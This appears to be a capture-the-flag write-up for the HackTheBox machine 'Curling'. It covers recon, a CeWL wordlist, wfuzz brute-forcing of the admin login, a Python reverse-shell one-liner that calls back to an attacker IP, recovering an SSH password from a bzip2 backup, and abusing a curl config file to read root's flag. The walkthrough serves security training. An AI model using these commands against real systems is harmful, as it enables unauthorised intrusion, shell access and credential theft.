---
layout: offsec
category: [offsec]
---

<img src="/assets/images/curling.png">

Curling: 10.10.10.150
=====================

__Tools:__

+ [wfuzz](https://github.com/xmendez/wfuzz)
+ curl


Recon
-----

```
ip="10.10.10.150"
nmap -sC -sV -oA nmap/init $ip
dirsearch -u http://$ip -e *
```


Gaining access
--------------

> As always a good starting point is a REST application and nmap shows that this system is hosting one. The first thing I noticed was the title "Cewl Curling site!"

[CeWL](https://tools.kali.org/password-attacks/cewl) is well known offsec tool that generates a list of words in function of the words on a HTML page.

As an alternative for hydra and the intruder module of burp, which is really slow for the community version, you can use [wfuzz](https://github.com/xmendez/wfuzz)

```
cewl http://$ip > cewl.list
```

I also found a comment referring to a `secret.txt` page which was a simple base64 blob (e.g.: "Curling2018!").

```
sudo pip install wfuzz
wfuzz -c -w ./cewl.list -d "username=FUZZ&passwd=Curling2018!" http://10.10.10.150/administrator/index.php
```

<img style="width:80%; height: auto" src="/assets/images/login.png">

<img style="width:80%; height: auto" src="/assets/images/dashboard.png">

<img  style="width:80%; height: auto" src="/assets/images/upload.png">

Spawning a real shell :)

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.13.133",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

python3 -c 'import pty; pty.spawn("/bin/sh")'
```

Decode the bzip2 file `/home/floris/password_backup` by tweaking it a bit following this [procedure](https://pymotw.com/2/bz2/)

    # First "hexlify" it (simply make use a text editor...)
    425a6839314159265359819bbb48000017fffffc41cf05f95029617661cc3a344edccccc6e11540023ab4025f802196020180ca000921c7a8340000000000000068069883468646989a6d439ea68c800000f51a00064681a069ea190000000346900078135016e18c2d78c98874a13a00868ae19c02ab0c17d792ec23c7e9d78f53e0809f0735654c27a4886dfa2e931c856921b122133856046a2ddc1730d22b9966ed40cdb87376a3a58ea64115290ad6bb12f081381208205a5f52970c50337dbab3be000ef85f439a414885018438259be5009861e4842d513ea1c2a098c8a47ab1d20a7554072ff177245385090819bbb48

    # Unhexlify it

    # Play with bzip2

    # Cat new.unp.out
    password.txt0000644000000000000000000000002313301066143012147 0ustar  rootroot5d<wdCbdZu)|hChXll

Great! Let's try these passwrods with ssh.

    ssh floris@$IP
    password: 5d<wdCbdZu)|hChXll
    floris@curling:


PrivEsc
-------

I didn't get a reverse shell, but I get the flag. Don't know if there's a way to get a full control to this machine with a root shell, but this box was odd since every user has access to what other are doing. In other term, I only enjoyed the bzip2 part. But anyway let's dive into it.

```bash
cat /home/floris/admin_area
url = "http://127.0.0.1"
```

Given this output, you can relate to curl `--config` flag. Thus, you can rewrite that file as follow:


```bash
# To get "ping" when the file has been fetched
local$ python -m SimpleHTTPServer 1234
```

```bash
# On the remote  server
url = "file:/root/root.txt"
-o /tmp/root.txt
url = "http://<local_IP>:1234"
```

When you receive a GET request from the RHOST you know you can read the new `root.txt` file located in `/tmp`. w00t! ;)
